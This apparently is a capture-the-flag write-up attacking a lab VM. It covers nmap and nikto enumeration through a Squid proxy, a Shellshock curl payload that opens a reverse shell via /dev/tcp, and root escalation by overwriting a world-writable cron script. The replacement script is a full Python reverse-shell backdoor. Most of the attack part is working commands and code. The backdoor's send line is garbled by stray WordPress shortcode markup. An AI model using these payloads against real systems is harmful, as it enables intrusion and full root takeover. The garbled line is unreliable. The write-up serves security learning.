# Finding the Box
```
nmap -sn 192.168.114.1-254
```
```
Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-16 20:08 AEDT
Nmap scan report for 192.168.114.2
Host is up (0.00013s latency).
MAC Address: 00:50:56:FE:6D:CA (VMware)
Nmap scan report for 192.168.114.133
Host is up (-0.088s latency).
MAC Address: 00:0C:29:69:FD:DA (VMware)
Nmap scan report for 192.168.114.254
Host is up (-0.10s latency).
MAC Address: 00:50:56:E0:B0:AD (VMware)
Nmap scan report for 192.168.114.131
Host is up.
Nmap done: 254 IP addresses (4 hosts up) scanned in 4.68 seconds
```
# Port Enumeration
```
Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-16 20:09 AEDT
Stats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 69.20% done; ETC: 20:10 (0:00:05 remaining)
Nmap scan report for 192.168.114.133
Host is up (0.00086s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
3128/tcp open   http-proxy Squid http proxy 3.1.19
8080/tcp closed http-proxy
MAC Address: 00:0C:29:69:FD:DA (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.87 seconds
```
# HTTP Enumeration
```
3128/tcp open   http-proxy Squid http proxy 3.1.19
```
From this we can see that a proxy is open
Trying to connect to http://192.168.114.133 we can see that it is stuck on connecting, so we can assume it is behind a proxy.

We configure the proxy using firefox
Settings>Advanced>Connection>Manual Proxy Connection

Using proxy ip 192.168.114.133 on port 3128
We try to connect again and we made connected through.

Using NIKTO making sure to use it through a proxy
```
nikto -h 192.168.114.133 -useproxy 192.168.114.133:3128
```
```
OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).
```
Shellshock vulnerability is found, since it is a linux kernel it is incredibly easy to just pass through a reverse shell.


# Exploiting Vulnerability - Shellshock

Basic shellshock.
```
curl -H "User-Agent: () { :; } ; " website.com
```
Using curl and modifying this to include a reverse shell. Making sure to connect through the proxy
```
curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.114.131/1234 0>&1" 192.168.114.133/cgi-bin/status --proxy 192.168.114.133:3128
```

# Privilege Escalation

Running a linux privilege checker script.

```
Scheduled cron jobs
    -rw-r--r-- 1 root root  722 Jun 20  2012 /etc/crontab
    /etc/cron.d:
    total 20
    drwxr-xr-x  2 root root 4096 Dec  5  2015 .
    drwxr-xr-x 90 root root 4096 Mar 16 14:35 ..
    -rw-r--r--  1 root root  102 Jun 20  2012 .placeholder
    -rw-r--r--  1 root root   52 Dec  5  2015 automate
    -rw-r--r--  1 root root  544 Jul  2  2015 php5
```

We find automate which gives us a clue.
```
cat automate
* * * * * root /usr/bin/python /var/www/connect.py
```
```
cat /var/www/connect.py
#!/usr/bin/python

print "I Try to connect things very frequently\n"
print "You may want to try my services"
```
According to this, it connects to things frequently, fortunately we have write access
```
ls -l /var/www/connect.py
-rwxrwxrwx 1 root root 109 Dec  5  2015 /var/www/connect.py
```
As cronjobs are usually run as root ,We can completely replace the file with an exploit named connect.py and hopefully create a shell with root.


# Exploit 

Using wget
```
wget 192.168.114.131/connect.py
```
We Replace the file with an exploit of our own 
From https://www.trustedsec.com/2011/06/creating-a-13-line-backdoor-worry-free-of-av/
```
#!/usr/bin/python
# imports here
import socket,subprocess
HOST = '192.168.114.131'    # The remote host
PORT = 1234            # The same port as used by the server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# connect to attacker machine
s.connect((HOST, PORT))
# send we are connected
s.send('[fusion_builder_container hundred_percent="yes" overflow="visible"][fusion_builder_row][fusion_builder_column type="1_1" background_position="left top" background_color="" border_size="" border_color="" border_style="solid" spacing="yes" background_image="" background_repeat="no-repeat" padding="" margin_top="0px" margin_bottom="0px" class="" id="" animation_type="" animation_speed="0.3" animation_direction="left" hide_on_mobile="no" center_content="no" min_height="none"][*] Connection Established!')
# start loop
while 1:
     # recieve shell command
     data = s.recv(1024)
     # if its quit, then break out and close socket
     if data == "quit": break
     # do shell command
     proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     # read output
     stdout_value = proc.stdout.read() + proc.stderr.read()
     # send output to attacker
     s.send(stdout_value)
# close socket
s.close()

```
Wait and Root
```
id
uid=0(root) gid=0(root) groups=0(root)
```

